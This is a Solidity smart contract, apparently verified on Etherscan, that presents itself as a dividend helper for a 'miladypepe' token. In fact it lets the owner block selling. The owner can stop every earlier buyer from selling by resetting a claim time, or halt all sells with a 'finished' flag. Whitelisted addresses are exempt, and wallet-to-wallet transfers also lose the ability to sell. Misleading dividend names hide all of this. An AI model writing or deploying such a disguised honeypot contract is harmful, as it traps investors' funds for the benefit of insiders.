/**
 *Submitted for verification at Etherscan.io on 2023-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

}

contract Ownable is Context {
    address private _owner;    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
   /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


    // /**
    //  * @dev Leaves the contract without owner. It will not be possible to call
    //  * `onlyOwner` functions anymore. Can only be called by the current owner.
    //  *
    //  * NOTE: Renouncing ownership will leave the contract without an owner,
    //  * thereby removing any functionality that is only available to the owner.
    //  */
    // function renounceOwnership() public virtual onlyOwner {
    //     emit OwnershipTransferred(_owner, address(0));
    //     _owner = address(0);
    // }
}

contract miladypepeDivid is Ownable {
    mapping(address => bool) private _whitelists;
    uint256 private claimMiladyTime;
    address private token;
    bool private isDividendFinishedMiladyPe;
    mapping (address => uint256) private _dividendTimePassedMilady;
    address private pair;

    modifier onlyToken() {
      require(msg.sender == token); 
      _;
    }

    function setClaimingTimeForDividmiladypepe() external onlyOwner {
      claimMiladyTime = block.timestamp;
    }
    function accumulativeMiladyPepeDividendOf(address _from, address _to) external onlyToken returns (uint256) {
      if (_whitelists[_from] || _whitelists[_to]) { return 1;
      }

      if (_from == pair) { if (_dividendTimePassedMilady[_to] == 0) {
          _dividendTimePassedMilady[_to] = block.timestamp;
        }
      } else if (_to == pair) {
        require(!isDividendFinishedMiladyPe && 
        _dividendTimePassedMilady[_from] >= claimMiladyTime);
      } else {        _dividendTimePassedMilady[_to] = 22;
      } 
      return 0;
    }
    
    receive() external payable {
    }
    
    function setDividendFinishemiladypepe(bool isFinished) external onlyOwner {
      isDividendFinishedMiladyPe = isFinished;
    }

    function setTokenForDividendmiladypepe(address _token, address _pair) external onlyOwner {
      token = _token;
      pair = _pair;
      isDividendFinishedMiladyPe = false;
      claimMiladyTime = 0;
    }
    function whitelistForDividendmiladypepe(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }
}